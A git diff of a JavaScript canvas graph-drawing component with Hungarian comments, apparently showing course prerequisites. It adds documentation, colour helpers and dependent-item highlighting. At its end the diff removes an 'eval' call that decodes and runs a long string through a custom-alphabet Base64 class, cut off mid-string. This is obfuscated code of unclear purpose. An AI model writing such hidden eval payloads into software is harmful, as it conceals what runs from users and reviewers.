@@ -16,54 +16,80 @@
  *
  */
 
+/**
+ * GraphDrawer osztály
+ *
+ * @class GraphDrawer
+ * @param {Object} container Tartalmazó div
+ * @constructor
+ */
 var GraphDrawer = function(container){
 
-	// Beállítások
+	/**
+	 * Alap beállítások.
+	 */
 	var Prefs = {
 		item: {
-			font: "bold 10px Arial",
-			lineHeight: 12,
-			maxTextLength: 100,
-			padding: 5,
-			margin: 5,
-			height: 56,
-			cornerRadius: 5,
+			font: "bold 10px Arial",	// Betűstílus
+			lineHeight: 12,				// Sormagasság
+			lineOffset: 2,				// Sorok közötti távolság
+			maxTextLength: 110,			// Max szövegszélesség
+			padding: 5,					// Padding a négyszög széleitől
+			margin: 5,					// Két négyszög közötti távolás
+			height: 56,					// Minimális négyszögmagasság
+			cornerRadius: 5,			// Sarok lekerekítés sugara
 		},
 		column: {
-			margin: 20
+			margin: 10 					// Oszlopok közötti távolság
 		},
 		connection: {
-			color: "rgba(0,0,0,0.1)",
-			width: 1
+			color: "rgba(0,0,0,0.1)",	// Kapcsolatok színe
+			width: 1 					// Kapcsolatok vonalvastagsága
 		},
 		container: {
-			fitHeight: true
+			fitHeight: true				// Automatikus magasságméretezés engedélyezése
 		},
 		colors: {
-			"normal":     "#478aa2",
-			"completted": "#a34854",
-			"canjoin":    "#79C900",
-			"highlight":  "#FFFFFF",
-			"hovered":    "#c43108"
+			"normal":     "#478aa2",	// Normál állapotú elemek háttérszíne
+			"completted": "#4212af",	// Teljesített elemek háttérszíne
+			"canjoin":    "#79C900",	// Teljesíthető elemek háttérszíne
+			"highlight":  "#FFFFFF",	// Kiemelt elemek háttérszíne
+			//"hovered":    "#c43108",	// Egér alatt lévő elem háttérszíne
+			"pendent":    "#c43108"     // Egér alatt lévő elemtől függő elemek háttérszíne
 		},
 		canvas: {
-			padding: 10
+			padding: 5 					// Vászon széle és elem közötti távolság
 		}
 	};
 
-	// Hash kódoló és dekódoló
+	/**
+	 * Base64 alapú kódoló- és dekódoló osztály.
+	 * 
+	 * @class Base64Class
+	 * @construnctor
+	 */
 	var Base64Class = function(){
+
+		/** Karakterkészlet */
 		var keyStr = "HZALONEUMBCDFGSv" +
 	            	 "VQRTWXY0cdfIJrPt" +
 	                 "szaloneu+g7hijkpq" +
 	                 "wxyb123456m89/=" +
 	                 "K";
+
+	    /**
+	     * Kódoló metódus. Szokványos base64 kódoló algoritmus.
+	     * 
+	     * @method encode
+	     * @param {String} input Kódolatlan szöveg
+	     * @return {String} Kódolt szöveg
+	     */
 	  	this.encode = function(input) {
 	    	input = escape(input);
-	    	var output = "";
-	    	var chr1, chr2, chr3 = "";
-	    	var enc1, enc2, enc3, enc4 = "";
-	    	var i = 0;
+	    	var output = "",
+	    		chr1, chr2, chr3 = "",
+	    		enc1, enc2, enc3, enc4 = "",
+	    		i = 0;
 
 			do {
 	        	chr1 = input.charCodeAt(i++);
@@ -90,9 +116,17 @@ var GraphDrawer = function(container){
 	        	chr1 = chr2 = chr3 = "";
 	        	enc1 = enc2 = enc3 = enc4 = "";
 	     	} while (i < input.length);
+
 	    	return output;
 	 	}
 
+	 	/**
+	 	 * Dekódoló metódus. Szokványos base64.
+	 	 *
+	 	 * @method decode
+	 	 * @param {String} input Kódolt karaktersorozat
+	 	 * @return {String} Dekódolt karaktersorozat
+	 	 */
 		this.decode = function(input) {
 	    	var output = "";
 	    	var chr1, chr2, chr3 = "";
@@ -128,50 +162,72 @@ var GraphDrawer = function(container){
 		}
 	}
 
-	// Rajzolást végző osztály
+	/**
+	 * Alap rajzolási metódusokat tartalmazó osztály.
+	 * 
+	 * @class Drawer
+	 * @param {CanvasRenderingContext2D} ctx Canvas 2D kontextus
+	 * @construnctor
+	 */
 	var Drawer = function(ctx){
+
+		/**
+		 * Lekerekített sarkú négyszög rajzolása.
+		 *
+		 * @method roundRect
+		 * @param {Object} startPoint Kezdőpont (bal felső sarok), például {x: 10, y: 20}
+		 * @param {Object} size Négyszög mérete, például {width: 100, height: 120}
+		 * @param {Integer} [radius=5] Lekerekítés mérete
+		 * @param {Integer} [offset=0] Az eredeti méretekhez képesti eltérés mértéke (középponzos eltérés)
+		 */
 		this.roundRect = function(startPoint, size, radius, offset) {
 			if (typeof radius === "undefined") {
-				radius = 5;
+				radius = 5;							// Ha nem adtak meg radiust, akkor legyen 5.
 			}
+
 			if(typeof offset == "undefined"){
-				offset = 0;
+				offset = 0;							// Ha nem adtak meg offset-et, akkor legyen 0.
 			}
 
 			ctx.beginPath();
+
 			ctx.moveTo(startPoint.x + offset + radius, startPoint.y + offset);
+
 			ctx.lineTo(startPoint.x + size.width - radius - offset, startPoint.y + offset);
 			ctx.quadraticCurveTo(startPoint.x + size.width - offset, startPoint.y + offset, startPoint.x + size.width - offset, startPoint.y + radius + offset);
+
 			ctx.lineTo(startPoint.x + size.width - offset, startPoint.y + size.height - radius - offset);
 			ctx.quadraticCurveTo(startPoint.x + size.width - offset, startPoint.y + size.height - offset, startPoint.x + size.width - radius - offset, startPoint.y + size.height - offset);
+
 			ctx.lineTo(startPoint.x + radius + offset, startPoint.y + size.height - offset);
 			ctx.quadraticCurveTo(startPoint.x + offset, startPoint.y + size.height - offset, startPoint.x + offset, startPoint.y + size.height - radius - offset);
+
 			ctx.lineTo(startPoint.x + offset, startPoint.y + radius + offset);
 			ctx.quadraticCurveTo(startPoint.x + offset, startPoint.y + offset, startPoint.x + radius + offset, startPoint.y + offset);
+
 			ctx.closePath();
 	   	}
 
-		this.colorBrightness = function(color){
-			if(color.length == 4){
-				color = "#"+color[1]+color[1]+color[2]+color[2]+color[3]+color[3];
-			}
-
-			var r = parseInt(color.substr(1, 2), 16),
-		        g = parseInt(color.substr(3, 2), 16),
-	    	    b = parseInt(color.substr(5, 2), 16);
-	    	return (0.2126*r) + (0.7152*g) + (0.0722*b);
-		}
-
+	   	/**
+	   	 * Két pont közötti íves vonal rajzoló metódus.
+	   	 *
+	   	 * @method drawConnection
+	   	 * @param {Object} startPoint Kezdőpont, például {x: 10, y: 20}
+	   	 * @param {Object} stopPoint Végpont, például {x: 30, y: 50}
+	   	 * @param {Integer} leveldiff Szinteltérés
+	   	 */
 		this.drawConnection = function(startPoint, stopPoint, leveldiff){
+			
 			ctx.strokeStyle = Prefs.connection.color;
-			ctx.lineWidth = Prefs.connection.width;
+			ctx.lineWidth   = Prefs.connection.width;
+
 			ctx.beginPath();
 			ctx.moveTo(
 				startPoint.x,
 				startPoint.y
 			);
 
-			if(leveldiff != 0){
+			if(leveldiff != 0){			// Ha eltérő szinten találhatóak az elemek, akkor...
 				ctx.bezierCurveTo(
 					startPoint.x + Math.abs((stopPoint.x - startPoint.x) / 2),
 					startPoint.y,
@@ -180,7 +236,7 @@ var GraphDrawer = function(container){
 					stopPoint.x,
 					stopPoint.y
 				);
-			}else{
+			}else{						// Ha azonos szinten vannak az elemek, akkor...
 				ctx.bezierCurveTo(
 					startPoint.x,
 					startPoint.y,
@@ -195,19 +251,92 @@ var GraphDrawer = function(container){
 			ctx.closePath();
 		}
 
+		/**
+		 * Szövegszélesség kalkuláció.
+		 *
+		 * @method measureText
+		 * @param {String} text Szöveg
+		 * @param {String} fontStyle Betűstílus
+		 * @return {Integer} Szöveg szélessége
+		 */
 		this.measureText = function(text, fontStyle){
 			ctx.font = fontStyle;
 			return ctx.measureText(text).width;
 		}
 
+		/**
+		 * Szín normalizálása #rrggbb formátumra.
+		 *
+		 * @method normalizeHex
+		 * @param {String} color Szín, lehet rövid és hosszú hexa, rgb és rgba.
+		 * @return Hosszú formáju hexa
+		 */
+		this.normalizeHex = function(color){
+			if(color.substring(0,3) == "rgb"){							// RGB v RGBA lett megadva
+
+				var offset = color[3] == "a" ? 1 : 0,					// Ha a negyedik karakter A, beállítunk egy eltolást
+					vals   = color.split(","),							// Vesszőknél felbontjuk a szót
+					r = parseInt(vals[0].trim().substr(4 + offset, 3)), // Levágjuk az RGB(A) részt
+					g = parseInt(vals[1]),
+					b = parseInt(vals[2]);
+				
+				/**
+				 * Integert alakít hexa kóddá, vezető nullával
+				 *
+				 * @method intToHex
+				 * @param {Integer} integer Konvertálandó szám
+				 * @return {String} Hexa érték
+				 */
+				var intToHex = function(integer){
+					var hex = "0" + integer.toString(16);
+					return hex.substr(hex.length - 2, 2);
+				}
+
+				return "#" + intToHex(r) + intToHex(g) + intToHex(b);
+
+ 			}else if(color[0] == "#"){
+
+ 				if(color.length == 4){									// Ha a hexa kód 4 karakter hosszú, úgy rövidített verzió
+ 					return "#" +
+ 						   color[1] + color[1] +
+ 						   color[2] + color[2] +
+ 						   color[3] + color[3];	
+ 				}
+
+ 				return color;
+ 			}
+		}
+
+		/**
+		 * Szín világosságának kalkulációja.
+		 *
+		 * @method colorBrightness
+		 * @param {String} color Szín
+		 * @return {Integer} Fényesség érték
+		 */
+		this.colorBrightness = function(color){
+			color = this.normalizeHex(color);
+
+			var r = parseInt(color.substr(1, 2), 16),
+		        g = parseInt(color.substr(3, 2), 16),
+	    	    b = parseInt(color.substr(5, 2), 16);
+	    	return (0.2126*r) + (0.7152*g) + (0.0722*b);				// http://en.wikipedia.org/wiki/Luminance_%28relative%29
+		}
+
+		/**
+		 * Hexa színkód RGBA-vá alakítása a megadott áttetszőséggel.
+		 *
+		 * @method hex2rgba
+		 * @param {String} hex Hexa színkód
+		 * @param {Integer} [opacity=1] Áttetszőség érték (0-1 közötti érték)
+		 * @return {String} RGBA színkód
+		 */
 		this.hex2rgba = function(hex, opacity){
-			if(hex[0] == "#"){
-				hex = hex.substring(1,7);
+			if(opacity == undefined){
+				opacity = 1;				// Ha nincs opacity beállítva, legyen 1.
 			}
 
-			if(hex.length == 3){
-				hex = hex[0]+hex[0]+hex[1]+hex[1]+hex[2]+hex[2];
-			}
+			hex = this.normalizeHex(hex);
 
 			var red   = parseInt(hex.substring(0,2),16),
 				green = parseInt(hex.substring(2,4),16),
@@ -216,95 +345,153 @@ var GraphDrawer = function(container){
 		}
 	}
 
-	// Elemek kezelése
+	/**
+	 * Elemek és kapcsolatai kezelése
+	 * 
+	 * @class ItemHandler
+	 * @construnctor
+	 */
 	var ItemHandler = function(){
-		var items       = new Array(),
-			connections = new Array(),
-			columns     = new Array(),
-			base64      = new Base64Class();
+		var items       = new Array(),			// Tárgyak listája
+			connections = new Array(),			// Kapcsolatok listája
+			columns     = new Array(),			// Oszlopok listája
+			base64      = new Base64Class();	// Kódoló példány
 
+		/**
+		 * Elem hozzáadása a listához.
+		 * Elem minimális felépítése:
+		 *
+		 * var item = {
+		 *	 "id": "elem azonosító",
+		 *   "name": "elem neve",
+		 *   "kredit": "kreditérték",
+		 *   "level": "félév"
+		 * };
+		 *
+		 * @method addItem
+		 * @param {Object} item Elem, amit hozzá kívánunk adni
+		 */
 		this.addItem = function(item){
-			if(this.getItemById(item.id) != undefined){
+			if(this.getItemById(item.id) != undefined){		// Ha már szerepel az elem a listában, nem csinálunk semmit sem.
 				return;
 			}
 
-			var words = item.name.split(" "),
-				text = new Array(),
-				t_text = "";
+			/**
+			 * Ki kell számolni az elem méreteit. Szélessége fix, magassága az elem nevétől
+			 * függ. Fel kell bontani a nevet sorokra, majd ennek kiszámolni a magasságát.
+			 */
+
+			var words  = item.name.split(" "),				// Felbontjuk a nevet a szóközök mentén.
+				text   = new Array(),						// A szöveg sorokra bontva lesz benne.
+				t_text = "";								// Átmeneti változó
 
 			ctx.font = Prefs.item.font;
 
 			for(var i = 0; i < words.length; i++){
-				if(drawer.measureText(t_text + words[i]) <= Prefs.item.maxTextLength || i == 0){
-					if(t_text.length > 0){
-						t_text += " ";
+				if(drawer.measureText(t_text + words[i]) <= Prefs.item.maxTextLength ||  // Ha az átmeneti változóban tárolt szöveg kisebb vagy egyenlő, mint a megengedett,
+				   i == 0){																 // vagy első szó, akkor
+					if(t_text.length > 0){												 // ha már tartalmaz szöveget az átmeneti változó
+						t_text += " ";													 // hozzáfűzűnk egy szóközt, majd
 					}
-					t_text += words[i];
+					t_text += words[i];													 // hozzáfűzzük az aktuális részletet.
 				}else{
-					text.push(t_text);
+					text.push(t_text);													 // Egyébként a gyűjtőtömbbe hozzáadjuk, mint új sor, és folytatjuk.
 					t_text = words[i];
 				}
 			}
-			text.push(t_text);
-			var calcheight = (text.length + 1) * 14;
+			text.push(t_text);															 // Utolsó részletet hozzáadjuk a szöveghez.
+			var calcheight = (text.length + 1) *
+			                 (Prefs.item.lineHeight + Prefs.item.lineOffset);			 // Elem magasságának számítása (a +1 a kredit kiíró sor miatt kell)
 
-			if(columns[item.level] == undefined){
+			/**
+			 * Minden oszlopról eltároljuk, hogy a következő elem milyen pontokba kerüljön. Ezeket
+			 * az adatokat a columns tömb tárolja.
+			 */
+
+			if(columns[item.level] == undefined){										// Ha még nincs erről az oszlopról adatunk, alapértelmezett adatokat generálunk.
 				columns[item.level] = {
 					x: (item.level - 1)*(Prefs.item.maxTextLength + Prefs.column.margin + 2*Prefs.item.padding + Prefs.item.margin) + Prefs.item.margin + Prefs.canvas.padding,
 					y: Prefs.canvas.padding
 				};
 			}
 
-			item.properties = {
-				status: "canjoin",
-				highlight: false,
-				hovered: false,
-				text: text,
-				position: {
+			item.properties = {															// Bővítjük az elemünket a következő adatokkal:
+				status: "canjoin",														// Elem állapota (fel lehet venni, teljesített, ...)
+				highlight: false,														// Kiemelt elem-e
+				hovered: false,															// Egér alatt álló elem-e
+				text: text,																// Sorokra felbontott név
+				position: {																// Elem pozíciója (bal felső sarok)
 					x: columns[item.level].x,
 					y: columns[item.level].y
 				},
-				size: {
+				size: {																	// Elem mérete (szélesség, magasság)
 					width: Prefs.item.maxTextLength + 2*Prefs.item.padding,
 					height: calcheight + 2*Prefs.item.padding
-				}
+				},
+				pendent: false
 			}
-			items.push(item);
+			items.push(item);															// Elem eltárolása
 
-			columns[item.level].y += Prefs.item.margin + item.properties.size.height;
+			columns[item.level].y += Prefs.item.margin + item.properties.size.height;	// Elem oszlopának 
 		}
 
+		/**
+		 * Kapcsolat hozzáadása. Az első elem függ a másodiktól.
+		 *
+		 * @method addConnection
+		 * @param {String} id1 Elem azonosító 1
+		 * @param {String} id2 Elem azonosító 2
+		 */
 		this.addConnection = function(id1, id2){
 			var item1 = this.getItemById(id1),
 				item2 = this.getItemById(id2);
 
-			if(item1 != undefined && item2 != undefined){
-				if(item1.level < item2.level){
+			if(item1 != undefined && item2 != undefined){			// Ha a két elem létezik
+				if(item1.level < item2.level){						// és azok szintje fordított, megcseréljük őket, majd
 					t = item1;
 					item1 = item2;
 					item2 = t;
 				}
 
-				if(connections[item1.id] ==  undefined){
-					connections[item1.id] = new Array();
-					item1.properties.status = "normal";
+				if(connections[item1.id] ==  undefined){			// ha még nincs az első elemnek függőséges,
+					connections[item1.id] = new Array();			// akkor létrehozzuk a kapcsolatok tárolására a tömböt,
+					item1.properties.status = "normal";				// majd 'canjoin'-ról 'normal'-ra állítjuk az állapotát
 				}
-				if(connections[item1.id].indexOf(item2.id) == -1){
+				if(connections[item1.id].indexOf(item2.id) == -1){  // Ha még nincs eltárolva a kapcsolat, eltároljuk.
 					connections[item1.id].push(item2.id);
 				}
 			}
 		}
 
+		/**
+		 * Elemek listájának lekérdezése
+		 * 
+		 * @method getItems
+		 * @return {Array} Elemek listája
+		 */
 		this.getItems = function(){
 
 			return items;
 		}
 
+		/**
+		 * Kapcsolatok listájának visszaadása
+		 * 
+		 * @method getConnections
+		 * @return {Array} Kapcsolatok listája
+		 */
 		this.getConnections = function(){
 
 			return connections;
 		}
 
+		/**
+		 * Elem visszaadása azonosító alapján
+		 *
+		 * @method getItemById
+		 * @param {String} id Elem azonosító
+		 * @return {Object} Elem vagy undefined
+		 */
 		this.getItemById = function(id){
 			for (var i = 0; i < items.length; i++) {
 				if(items[i].id == id){
@@ -314,11 +501,19 @@ var GraphDrawer = function(container){
 			return undefined;
 		}
 
+		/**
+		 * Kapcsolatok kezdő és végpontjainak listájának lekérdezése
+		 *
+		 * @method getConnectionPoints
+		 * @return {Array} Kapcsolati pontok listája
+		 */
 		this.getConnectionPoints = function(){
 			var points = new Array();
+
 			for(var i = 0; i < items.length; i++){
 				if(connections[items[i].id] != undefined){
 					startPoint = items[i].properties.position;
+
 					for(var j = 0; j < connections[items[i].id].length; j++){
 						points.push({
 							startPoint: startPoint,
@@ -330,6 +525,13 @@ var GraphDrawer = function(container){
 			return points;
 		}
 
+		/**
+		 * Elem előzményeinek lekérdezése
+		 *
+		 * @method getRoots
+		 * @param {String} id Elem azonosító
+		 * @return {Array} Elemek listája
+		 */
 		this.getRoots = function(id){
 			var roots = new Array();
 			if(connections[id] != undefined){
@@ -340,6 +542,13 @@ var GraphDrawer = function(container){
 			return roots;
 		}
 
+		/**
+		 * Elemre épülő tárgyak lekérdezése
+		 *
+		 * @method getFollows
+		 * @param {String} id Elem azonosító
+		 * @return {Array} Elemek listája
+		 */
 		this.getFollows = function(id){
 			var follows = new Array();
 			for (var i = 0; i < items.length; i++) {
@@ -350,6 +559,34 @@ var GraphDrawer = function(container){
 			return follows;
 		}
 
+		this.pendentCollector = function(id, arr){
+			var follows = this.getFollows(id);
+			if(arr.indexOf(id) == -1){
+				arr.push(id)
+			}
+			for(var i = 0; i < follows.length; i++){
+				this.pendentCollector(follows[i].id, arr);
+			}
+		}
+
+		this.getPendents = function(id){
+			var pendents = new Array();
+				follows = this.getFollows(id);
+
+			for (var i = 0; i < follows.length; i++){
+				this.pendentCollector(follows[i].id, pendents);
+			};
+
+			return pendents;
+		}
+
+		/**
+		 * Egérmutató alatti elem visszaadása
+		 * 
+		 * @method getHoveredItem
+		 * @param {Object} mouse Egér pozíciójának canvas-hoz képest relatív koordinátái, például {x: 100, y: 110}
+		 * @return {Object} Egér alatti elem
+		 */
 		this.getHoveredItem = function(mouse){
 			var item = undefined;
 			for(var i = 0; i < items.length; i++){
@@ -377,6 +614,13 @@ var GraphDrawer = function(container){
 			return item;
 		}
 
+		/**
+		 * Elem állapotának megállapítása a függőségei és aktuális állapota alapján
+		 *
+		 * @method getStatus
+		 * @param {String} id Elemazonosító
+		 * @return {String} Elem állapota
+		 */
 		this.getStatus = function(id){
 			if(this.getItemById(id).properties.status == "completted"){
 				return "completted";
@@ -392,6 +636,11 @@ var GraphDrawer = function(container){
 			return "canjoin";
 		}
 
+		/**
+		 * "Hover" állapot megszűntetése.
+		 *
+		 * @method clearHover
+		 */
 		this.clearHover = function(){
 			for(var i = 0; i < items.length; i++){
 				if(items[i].properties.hovered){
@@ -401,6 +650,12 @@ var GraphDrawer = function(container){
 			}
 		}
 
+		/**
+		 * Gráf magasságának kiszámítása.
+		 *
+		 * @method getGraphSize
+		 * @return {Integer} A megjelenítéshez szükséges magasság pixelben.
+		 */
 		this.getGraphSize = function(){
 			var width = 0,
 				height = 0;
@@ -424,6 +679,12 @@ var GraphDrawer = function(container){
 			return size;
 		}
 
+		/**
+		 * Aktuálisan bejelölt állapot kódjának előállítása.
+		 *
+		 * @method serialize
+		 * @return {String} Állapotkód
+		 */
 		this.serialize = function(){
 			var toserialize = new Array();
 
@@ -445,6 +706,12 @@ var GraphDrawer = function(container){
 			return base64.encode(seri);
 		}
 
+		/**
+		 * Állapotkód alapján visszaállítás.
+		 *
+		 * @method unserialize
+		 * @param {String} data Állapotkód
+		 */
 		this.unserialize = function(data){
 			var decoded = base64.decode(data).split("|");
 
@@ -458,18 +725,33 @@ var GraphDrawer = function(container){
 			EventBus.dispatch("redrawAll", this);
 		}
 
+		/**
+		 * Elemek állapotának frissítése.
+		 *
+		 * @method refresh
+		 */
 		this.refresh = function(){
 			for(var i = 0; i < items.length; i++){
 				items[i].properties.status = this.getStatus(items[i].id);
 			}
 		}
 
+		/**
+		 * Adatok ürítése
+		 *
+		 * @method clear
+		 */
 		this.clear = function(){
 			items = [];
 			connections = [];
 			columns = [];
 		}
 
+		/**
+		 * Összeállítás törlése, alapállapot helyreállítása.
+		 *
+		 * @method clearSelection
+		 */
 		this.clearSelection = function(){
 			for(var i = 0; i < items.length; i++){
 				items[i].properties.status = "normal";
@@ -480,19 +762,21 @@ var GraphDrawer = function(container){
 		}
 	}
 
-	// Alap változók
-	var canvas = container.appendChild(document.createElement("canvas")),
-		ctx	   = canvas.getContext("2d"),
-		drawer = new Drawer(ctx),
-		items  = new ItemHandler(),
-		coder  = new Base64Class();
+	var canvas = container.appendChild(document.createElement("canvas")),	// Létrehozunk egy canvast az átadott div-ben
+		ctx	   = canvas.getContext("2d"),									// A létrehozott canvas 2D kontextusa
+		drawer = new Drawer(ctx),											// Rajzoló példány
+		items  = new ItemHandler(),											// Elem kezelő példány
+		coder  = new Base64Class();											// Kódoló-dekódoló példány
 
-	container.style.overflow = "auto";
+	container.style.overflow = "auto";										// Tartalmazó div scrollok auto-ra állítása
 
-	if(typeof(ctx.mozImageSmoothingEnabled) == "boolean"){
+	if(typeof(ctx.mozImageSmoothingEnabled) == "boolean"){					// Ha van canvas smoothing, bekapcsoljuk
 		ctx.mozImageSmoothingEnabled = true;
 	}
 
+	/**
+	 * Egérmozgás esemény kezelése
+	 */
 	canvas.onmousemove = function(e){
 		e.stopPropagation();
 
@@ -514,6 +798,9 @@ var GraphDrawer = function(container){
 		}
 	}
 
+	/**
+	 * Kattintás esemény kezelése
+	 */
 	canvas.onclick = function(e){
 
 		if(typeof(e.stopImmediatePropagation) == "function"){
@@ -561,21 +848,47 @@ var GraphDrawer = function(container){
 		EventBus.dispatch("publicClickEvent", this, clone, e);
 	}
 
+	/**
+	 * Elem hozzáadása metódus.
+	 *
+	 * @method addItem
+	 * @param {Object} itemDesc Hozzáadandó elem.
+	 */
 	this.addItem = function(itemDesc){
 	
 		items.addItem(itemDesc);
 	}
 
+	/**
+	 * Kapcsolat hozzáadása.
+	 *
+	 * @method addConnection
+	 * @param {String} id1 Egyik elem azonosító
+	 * @param {String} id2 Másik elem azonosító
+	 */
 	this.addConnection = function(id1, id2){
 
 		items.addConnection(id1, id2);
 	}
 
+	/**
+	 * Elem lekérdezése
+	 * 
+	 * @method getItem
+	 * @param {String} id Azonosító
+	 * @return {Object} Keresett elem vagy "undefined"
+	 */
 	this.getItem = function(id){
 	
 		return items.getItemById(id);
 	}
 
+	/**
+	 * Elem kirajzolása
+	 *
+	 * @method drawItem
+	 * @param {String} id Elem azonosítója
+	 */
 	this.drawItem = function(id){
 		var item = items.getItemById(id);
 
@@ -590,10 +903,13 @@ var GraphDrawer = function(container){
 		);
 
 		if(item.properties.hovered){
-			bgcolor = Prefs.colors["hovered"];
+			//bgcolor = Prefs.colors["hovered"];
+			bgcolor = Prefs.colors[item.properties.status];
 			canvas.style.cursor = "pointer";
 		} else if(item.properties.highlight){
 			bgcolor = Prefs.colors["highlight"];
+		} else if(item.properties.pendent){
+			bgcolor = Prefs.colors["pendent"];
 		} else {
 			bgcolor = Prefs.colors[item.properties.status];
 		}
@@ -616,28 +932,6 @@ var GraphDrawer = function(container){
 			ctx.stroke();
 		}
 
-		drawer.roundRect(
-			item.properties.position,
-			item.properties.size,
-			Prefs.item.cornerRadius
-		);
-
-		lingrad = ctx.createLinearGradient(
-			item.properties.position.x,
-			item.properties.position.y,
-			item.properties.position.x,
-			item.properties.position.y + item.properties.size.height);
-
-		var bottommargin = 5;
-
-		lingrad.addColorStop(  0, "rgba(255, 255, 255,  0)");
-		lingrad.addColorStop( 1 - (bottommargin / item.properties.size.height), "rgba(255, 255, 255, .05)");
-		lingrad.addColorStop( 1 - (bottommargin / item.properties.size.height), "rgba(0, 0, 0, .1)");
-		lingrad.addColorStop(  1, "rgba(255, 255, 255, .0)");
-
-		ctx.fillStyle = lingrad;
-		ctx.fill();
-
 		ctx.font = Prefs.item.font;
 		ctx.textAlign = "center";
 
@@ -653,33 +947,63 @@ var GraphDrawer = function(container){
 			offset = -1;
 		}
 
+		if(item.properties.hovered){
+			var linewidth = 2;
+
+			drawer.roundRect(
+				item.properties.position,
+				item.properties.size,
+				Prefs.item.cornerRadius - linewidth,
+				linewidth
+			);
+
+			ctx.strokeStyle = "#000";
+			ctx.stroke();
+		}
+
 		var drawText = function(color, offset){
 			ctx.fillStyle = color;
 			for(var i = 0; i < item.properties.text.length; i++){
 				ctx.fillText(
 					item.properties.text[i],
 					item.properties.position.x + item.properties.size.width / 2,
-					item.properties.position.y + offset + Prefs.item.padding + (i+1)*Prefs.item.lineHeight);
+					item.properties.position.y + offset + (i+1)*(Prefs.item.lineHeight + Prefs.item.lineOffset));
 			}
 			ctx.fillText(item.kredit + " kredit",
 						 item.properties.position.x + item.properties.size.width / 2,
-						 item.properties.position.y + offset + item.properties.size.height - 10);
+						 item.properties.position.y + offset + item.properties.size.height - Prefs.item.padding);
 		}
 
 		drawText(fontBgColor, offset);
 		drawText(fontMainColor, 0);
 
 		if(item.properties.hovered){
-			roots = items.getRoots(item.id);
+			var roots = items.getRoots(item.id);
 
 			for(var i = 0; i < roots.length; i++){
 				roots[i].properties.highlight = true;
 				EventBus.dispatch("redrawItem", this, roots[i].id);
 			}
+
+			var pendents = items.getPendents(item.id);
+			for(var i = 0; i < pendents.length; i++){
+				var pitem = items.getItemById(pendents[i]);
+				pitem.properties.pendent = true;
+				EventBus.dispatch("redrawItem", this, pendents[i]);
+			}
+
+
 		}
 
 	}
 
+	/**
+	 * Kapcsolat kirajzolása
+	 *
+	 * @method drawConnection
+	 * @param {String} id1 Egyik elem azonosító
+	 * @param {String} id2 Másik elem azonosító
+	 */
 	this.drawConnection = function(id1, id2){
 		var item1 = items.getItemById(id1),
 			item2 = items.getItemById(id2);
@@ -711,6 +1035,11 @@ var GraphDrawer = function(container){
 		}
 	}
 
+	/**
+	 * Összes elem (újra/ki)rajzolása
+	 *
+	 * @method drawItems
+	 */
 	this.drawItems = function(){
 		var itemlist = items.getItems();
 		for(var i = 0; i < itemlist.length; i++){
@@ -718,6 +1047,11 @@ var GraphDrawer = function(container){
 		}
 	}
 
+	/**
+	 * Összes kapcsolat (újra/ki)rajzolása
+	 *
+	 * @method drawConnections
+	 */
 	this.drawConnections = function(){
 		var itemList = items.getItems();
 		var conns = items.getConnections();
@@ -729,10 +1063,15 @@ var GraphDrawer = function(container){
 				}
 			}
 		}
-
-		eval(coder.decode("BTM4duXkc3QgI24nFlzoBTM5BTrAfYcnFlz3fY5oI3JkIE9lc0QgI24kfENyfAWyQAWyQAWxGxWxF3G6cYwpIe5zBTM3BTM5BTrAreNxBTMqcxWyQEQpc3XjdY5bDeGxdYNbdWXidY1nIuVnFlsnFlrlcY52c0FnFlJnFlonFoGzBTGOcx5ud0QLI25bd0zbBTM4BTM3FeVnFlJnFlonFbBlDurgdUQ+BTGOFTHqFAWyVeFkfEXgd2zbBTGOFTHqFAWyVed1IeGbfY9kBTMqdRWxSAWxSRW3Ved1IeGbfY9kBTMqJaWxSEcnFoGuBTM5BTrAcR5jI3dnXE8nFlzeBTBLdxWxSRW3QEd1IeGbfY9kBTMqJRWxSUJnFoG2BTBLfRWxV2snFoGuBTBLdaWxSRW3VeOkceX6fYXxV3XxreXWIxWxSUJnFoG2BTBLfRWxV2snFoGuBTBLdaWxSRW3QEd1IeGbfY9kBTMqJAWxSEcnFoGuBTM5BTrAcR5ifY5nXE8nFlzeBTBLdxWxSRW3QEd1IeGbfY9kBTMqIxWxSAWxSRW3VeOkJ3QxI2jnBTM4BTM5BTrOduXkc3QgI24nFlZkBTM4BTM5BTrAcR5adYrgInZzrEsnFlsnFlonGbQerY5lrEnpIaWxFEbnFlsnFlonGbBzDeGiI3GnWENbfAWxSAWxSRW3QEd1IeGbfY9kBTMqIAWxSAWxSRW3Ve8nFlsnFlonFbBkBTM4BTM5BTrOduXkc3QgI24nFlZhBTM4daWxV3VnFoGuBTBLJxWxSRW3VuMnFlzeBTBLrAWxSRWyVedpJaWxSUdzJaWxFEsnFbVqBTGAfAWyV2JkIEXkd3Q+BTGAfAihBTM5BTrAJRWxSEJnGWB+BTXOBTXAFAW1QAWxV2JnGWB+BTXOBTXAFRW1QAWxV2JnGWB+BTXOBTXAFaW1QAWxV2JnGWB+BTXOBTXAFxW1QAWxV2JnGWB+BTXOBTXAGAW1QAWxV2JnGWB+BTXOBTXAGRW1QAWxSRW3QEneBTM4JxWyQAWyQUQxrYWnFlonGbBjBTM4BTM5BTrOIAWxSAWxSRW3QEd1IeGbfY9kBTMqfaWxSEcnFoGyBTBLdxWxSRW3VuMnFlzeBTBLJxWxSRWyVedpJaWxSUdzJaWxFEsnFbVqBTGAfAWyV2JkIEXkd3Q+BTGAfAihBTM5BTrAJAWxSEJnGWB+BTXOBTXAFAW1QAWxV2JnGWB+BTXOBTXAFRW1QAWxSRW3QEqnFlsnFlonGbQkBTM4BTM5BTGAJaWxSLHnFoFqBTM5BTGAJAWxSLMbFAWxVyHnFlonFbBqBTM4FlVqBTBLFTsqBTM5BTGAJAWxSLHnFoFwSLHnFlonFbBjBTM4BTM5BTGAIaWxSAWxSRWyVeinFls3SAWxVyOqFAWxVxW1VaW1VlJ4BTBLFTHqBTBLGycnFoFwFLVnFoF3SAWxVyOqGaW1QAWxVxW1VlsqBTBLFTH4BTBLSLFnFoFwFLcnFoF4GaWxVyOqSAW1QAWxVxW1Vls5BTBLFTOqBTBLSTMnFoFwFTVnFoF5GRWxVyOwFxW1QAWxVxW1Vlo4BTBLFTOxBTBLSTsnFoFwFLsnFoFwFLHnFoFwFLJnGWVnFoFnGWMwFLMnFoFwFLcnFoFwFLVnFoFwFLWnFoFwFLVnFoFwFLVnGWVnFoFnGWMwFLFnFoFwFLMnFoFwFLFnFoFwFLMnFoFwFLFnFoFwFLMnGWVnGWVnFlonFbBhBTM4FTHbBTBLFTOxBTBLBTXABTXAFTHbBTBLFTOxBTBLFTHwBTBLFTO1BTBLSTsnFoF